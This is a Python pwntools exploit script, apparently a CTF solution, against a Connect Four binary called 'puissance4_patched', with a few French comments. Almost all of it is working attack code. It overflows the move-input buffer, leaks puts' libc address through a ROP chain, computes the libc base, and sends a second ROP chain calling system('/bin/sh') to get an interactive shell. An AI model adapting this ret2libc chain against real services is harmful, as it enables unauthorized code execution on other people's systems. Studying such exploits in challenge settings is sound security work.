from pwn import *

exe = ELF('./puissance4_patched')
context.binary = exe
context.log_level = 'debug'

libc = ELF('./libc-2.41.so')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 16

pop_rdi = 0x401735
ret = 0x401016

puts_plt = exe.plt['puts'] # 0x401030 : "trampoline" pour appeler puts()
puts_got =  exe.got['puts'] # 0x405000 : case mémoire contenant l'adresse
player_turn = 0x402370

leak1 = flat({offset:[ret,pop_rdi,puts_got,puts_plt,player_turn]})
io.recvuntil(b"Your move [0 - 6]: ")
io.sendline(leak1) 

leak = io.recvline().strip()
leakcl = u64(leak.ljust(8, b"\x00"))
log.success(hex(leakcl))

libc.address = leakcl - libc.symbols["puts"] # base_libc = adresse_réelle_de_puts - offset_de_puts_dans_la_libc

bin_sh   = next(libc.search(b'/bin/sh\x00'))

system = libc.symbols['system']
log.info(hex(system))

payload = flat({offset:[pop_rdi,bin_sh,system]})
io.recvuntil(b"Your move [0 - 6]: ")
io.sendline(payload)

io.interactive()

